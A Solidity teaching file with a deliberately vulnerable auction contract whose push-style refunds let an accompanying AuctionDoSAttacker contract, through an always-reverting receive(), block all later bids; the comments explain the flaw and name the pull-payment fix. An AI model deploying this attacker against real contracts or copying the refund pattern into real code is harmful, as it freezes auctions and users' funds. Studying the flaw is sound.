// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

/// @title SimpleAuction
contract SimpleAuction {
    /// address of the current leader of the auction
    address public currentLeader;
    /// highest bid so far
    uint256 public highestBid;

    /// Bid on the auction with the value sent together with this transaction.
    /// The old auction leader will receive his ETH back.
    /// To fix use a 'pull payment system'.
    function bid() public payable {
        require(msg.value > highestBid);

        // this below is the point where the auction leader receives his ETH back
        // which triggers the `receive()` method where the attacker can
        // take control of the flow and the DoS attack happens
        (bool sent, ) = currentLeader.call{value: highestBid}('');
        require(sent, 'failed to refund');

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

/// @title AuctionDoSAttacker
contract AuctionDoSAttacker {
    /// An interface to the target that will allow us to call its functions.
    SimpleAuction public target;

    /// Set the target on deployment because we need it in storage
    /// to be able to call it from the receive function.
    constructor(address _target) {
        target = SimpleAuction(_target);
    }

    /// Bid on the auction with the value sent together with this transaction.
    /// This contract will be the new auction leader if the transaction is successful.
    function bid() public payable {
        target.bid{value: msg.value}();
    }

    /// This is called when the target contract sends ETH to this contract.
    /// Whenever the auction tries to refund us, we will revert the transaction
    /// and thus prevent any new bids from being made.
    receive() external payable {
        revert('AuctionDoSAttacker: bid denied');
    }
}
